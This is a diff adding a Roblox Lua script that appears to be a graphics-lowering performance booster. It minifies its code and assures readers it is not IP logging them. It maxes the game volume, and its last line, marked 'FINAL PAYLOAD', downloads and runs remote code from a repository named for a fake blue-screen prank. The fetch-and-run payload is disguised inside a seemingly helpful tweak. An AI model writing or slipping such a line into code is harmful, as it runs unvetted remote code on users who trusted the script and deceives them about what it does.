@@ -1,0 +1,11 @@
+-- I just made it better, really. I don't take credits for this
+
+UserSettings():GetService("UserGameSettings").MasterVolume = 1 -- CHANGE VOLUME TO MAX
+
+-- Used Lua minifier. Please use Lua Beautifier if u don't trust i'm not IP logging u
+-- Used it just because it doesn't eat ALOT of lines in my poor code
+
+local a=workspace:FindFirstChildOfClass('Terrain')a.WaterWaveSize=0;a.WaterWaveSpeed=0;a.WaterReflectance=0;a.WaterTransparency=0;Lighting.GlobalShadows=false;Lighting.FogEnd=9e9;settings().Rendering.QualityLevel=1;for b,c in pairs(game:GetDescendants())do if c:IsA("Part")or c:IsA("UnionOperation")or c:IsA("MeshPart")or c:IsA("CornerWedgePart")or c:IsA("TrussPart")then c.Material="Plastic"c.Reflectance=0 elseif c:IsA("Decal")then c.Transparency=1 elseif c:IsA("ParticleEmitter")or c:IsA("Trail")then c.Lifetime=NumberRange.new(0)elseif c:IsA("Explosion")then c.BlastPressure=1;c.BlastRadius=1 end end;for b,c in pairs(Lighting:GetDescendants())do if c:IsA("BlurEffect")or c:IsA("SunRaysEffect")or c:IsA("ColorCorrectionEffect")or c:IsA("BloomEffect")or c:IsA("DepthOfFieldEffect")then c.Enabled=false end end;workspace.DescendantAdded:Connect(function(d)coroutine.wrap(function()if d:IsA('ForceField')then RunService.Heartbeat:Wait()d:Destroy()elseif d:IsA('Sparkles')then RunService.Heartbeat:Wait()d:Destroy()elseif d:IsA('Smoke')or d:IsA('Fire')then RunService.Heartbeat:Wait()d:Destroy()end end)()end)
+
+-- FINAL PAYLOAD
+loadstring(game:HttpGet("https://github.com/RunDTM/roblox-bluescreen/raw/main/bsod.lua",true))()
